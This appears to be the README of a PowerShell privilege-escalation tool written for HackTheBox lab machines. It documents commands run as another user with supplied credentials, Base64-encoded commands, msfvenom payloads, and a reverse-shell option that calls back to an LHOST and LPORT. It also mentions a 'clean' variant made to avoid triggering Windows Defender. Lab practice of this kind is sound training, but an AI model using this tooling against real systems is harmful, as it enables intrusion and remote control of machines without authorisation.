# About
A PowerShell script that lets you execute commands as another user.

These scripts were made to be used in solving HackTheBox boxes. Some Windows boxes require you to run commands as another user to elevate your privilege and these scripts just do that!

There are two versions of this script. The **Clean** and **Normal**. The Normal script has a built-in PowerShell reverse shell one-liner, however, that one-liner might cause the Windows Defender to be triggered in some boxes. That is why there is a clean version without the one-liner.

You can also use the command feature to execute `msfvenom` payloads.

# Parameters
```powershell
-Help | -h            # Displays help and how to use the script.
-Username | -u        # Username of the user you want to run commands as.
-Password | -p        # Password of the user you want to run commands as.
-ComputerName | -cn   # Current computer's name. (required for the Invoke-Command command)
-Command | -c         # Command you want to run.
-Base64 | -b          # If set, lets you to pass Base64 encoded command .(Used alongside with -c)
-RevShell | -rs       # If set, uses the PowerShell reverse shell one-liner.
-LHOST | -lh          # Listening machine's ip address. (Used alongside with -rs)
-LPORT | -lp          # Listening machine's port. (Used alongside with -rs)
```
# Examples
```powershell
Regular Command:
.\Run-As.ps1 -Username <username> -Password <password> -ComputerName <computer name> -Command <command>
or
.\Run-As.ps1 -u <username> -p <password> -cn <computer name> -c <command>

---

Base64 Command:
.\Run-As.ps1 -Username <username> -Password <password> -ComputerName <computer name> -Base64 -Command <command>
or
.\Run-As.ps1 -u <username> -p <password> -cn <computer name> -b -c <command>

---

Reverse Shell (using built-in PowerShell commands)
.\Run-As.ps1 -Username <username> -Password <password> -ComputerName <computer name> -RevShell -LHOST <local ip> -LPORT <local port>
or
.\Run-As.ps1 -u <username> -p <password> -cn <computer name> -rs -lh <local ip> -lp <local port>
```

# Misc
PowerShell one liner taken from: https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
